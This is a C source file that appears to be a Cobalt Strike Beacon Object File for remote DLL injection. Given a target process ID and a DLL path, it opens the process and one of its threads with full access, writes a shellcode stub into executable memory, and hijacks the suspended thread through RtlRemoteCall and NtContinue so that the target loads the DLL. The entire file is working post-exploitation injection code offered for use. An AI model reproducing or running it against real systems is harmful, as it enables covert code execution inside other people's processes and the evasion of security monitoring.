#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h>
#include <processsnapshot.h>
#include "beacon.h"
#include "loadlib.h"


int FindThreadID(int pid){

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (KERNEL32$Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid)  {
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	KERNEL32$CloseHandle(Snap);
	
	return tid;
}


typedef struct _API_REMOTE_CALL {
	size_t		retval;
	
	NtContinue_t ntContinue;
	CONTEXT		context;
	
	LoadLibraryA_t ARK_func;
	char		param1[100]; // LPCSTR
	
} ApiReeKall;


void SHELLCODE(ApiReeKall * ark){
	size_t ret = (size_t) ark->ARK_func(ark->param1);
	ark->retval = ret;
	ark->ntContinue(&ark->context, 0);
}

void SHELLCODE_END(void) {}


size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
	char prolog[] = { 	0x49, 0x8b, 0xcc,   // mov rcx, r12
						0x49, 0x8b, 0xd5,	// mov rdx, r13
						0x4d, 0x8b, 0xc6,	// mov r8, r14
						0x4d, 0x8b, 0xcf	// mov r9, r15
					};
	int prolog_size = sizeof(prolog);
	
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
	NtContinue_t pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");
	
	if (pRtlRemoteCall == NULL || pNtContinue == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Error resolving native API calls!\n");
		return -1;		
	}
	
	void * remote_mem = KERNEL32$VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Error allocating remote memory!\n");
		return -1;
	}
	
	size_t sc_size = (size_t) SHELLCODE_END - (size_t) SHELLCODE;
	
	size_t bOut = 0;
#ifdef _WIN64 
	if (KERNEL32$WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T *) &bOut) == 0) {
		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		BeaconPrintf(CALLBACK_ERROR, "Error writing remote memory (prolog)!\n");
		return -1;
	}
#else
	prolog_size = 0;
#endif
	if (KERNEL32$WriteProcessMemory(hProcess, (char *) remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) {
		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		BeaconPrintf(CALLBACK_ERROR, "Error writing remote memory (shellcode)!\n");
		return -1;
	}
	
	ark.retval = RETVAL_TAG;
	ark.ntContinue = pNtContinue;
	ark.context.ContextFlags = CONTEXT_FULL;
	KERNEL32$SuspendThread(hThread);
	KERNEL32$GetThreadContext(hThread, &ark.context);

	ApiReeKall * ark_arg;
	ark_arg = (ApiReeKall  *) ((size_t) remote_mem + sc_size + prolog_size + 4);
	if (KERNEL32$WriteProcessMemory(hProcess, ark_arg, &ark, sizeof(ApiReeKall), 0) == 0) {
		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		KERNEL32$ResumeThread(hThread);
		BeaconPrintf(CALLBACK_ERROR, "Error writing remote memory (ApiReeKall arg)!\n");
		return -1;		
	}

	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG) &ark_arg, 1, 1);
	if (status != 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed RtlRemoteCall with status code: %x\n", status);
		KERNEL32$ResumeThread(hThread);
		return 0;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Made successful remote RPC call with status code: %x\n[*] Wait for the RPC call to be triggered in the remote process..\n", status);
	KERNEL32$ResumeThread(hThread);
	
	size_t ret = 0;
	while(TRUE) {
		KERNEL32$Sleep(1000);
		KERNEL32$ReadProcessMemory(hProcess, ark_arg, &ret, sizeof(size_t), (SIZE_T *) &bOut);
		if (ret != RETVAL_TAG) break;
	}

	if (!KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE))
		BeaconPrintf(CALLBACK_ERROR, "Remote shellcode memory could not be released\n");
	
	return ret;
}


void go(char *args, int len){
	datap parser;
	int pID = 0;
	char *pathToDLL;

	BeaconDataParse(&parser, args, len);
	pID = BeaconDataInt(&parser);
    pathToDLL = BeaconDataExtract(&parser, NULL);

	DWORD tID = FindThreadID(pID);
	if (tID == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Could not find a suitable thread in target process!\n");
		return -1;		
	}
	
	HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
	HANDLE hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, 0, tID);
	if (hProcess == NULL || hThread == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Error opening remote process or thread!\n");
		return -1;		
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to remote process and thread!\n");
	
	ApiReeKall ark = { 0 };
	ark.ARK_func = (LoadLibraryA_t) GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
	MSVCRT$strcpy_s(ark.param1, 100, pathToDLL);
	
	size_t ret = MakeReeKall(hProcess, hThread, ark);
	if(ret != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Received call confirmation. DLL should be loaded!\n", ret);
	}

	KERNEL32$CloseHandle(hThread);
	KERNEL32$CloseHandle(hProcess);

	return 0;
}